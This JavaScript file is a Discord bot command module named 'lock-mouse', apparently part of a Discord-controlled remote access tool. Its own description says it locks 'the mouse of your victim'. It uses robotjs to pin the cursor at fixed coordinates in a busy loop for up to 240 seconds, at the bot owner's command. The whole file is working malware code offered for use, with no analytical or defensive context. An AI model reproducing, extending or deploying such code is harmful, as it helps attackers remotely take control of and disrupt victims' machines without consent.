const { ApplicationCommandOptionType } = require("discord.js"),
robot = require("@jitsi/robotjs");

module.exports = {
  name: "lock-mouse",
  ownerOnly: true,
  description: "lock the mouse of your victim",
  options: [
    {
      name: "number",
      description: "1-240",
      required: true,
      type: ApplicationCommandOptionType.Number,
    },
  ],
  run: async (client, interaction, args) => {
    const msgnum = interaction.options.getNumber("number");
    await interaction.reply({
      content: `Mouse Locked for ${msgnum} sec`,
      ephemeral: true,
    });
    await BlockMouse(msgnum)
  },
};

async function BlockMouse(durationInSeconds) {
  const startTime = Date.now();
  const durationInMilliseconds = durationInSeconds * 1000;

  let elapsedTime = 0;

  while (elapsedTime < durationInMilliseconds) {
    robot.moveMouse(879, 313);
    elapsedTime = Date.now() - startTime;
  }
}
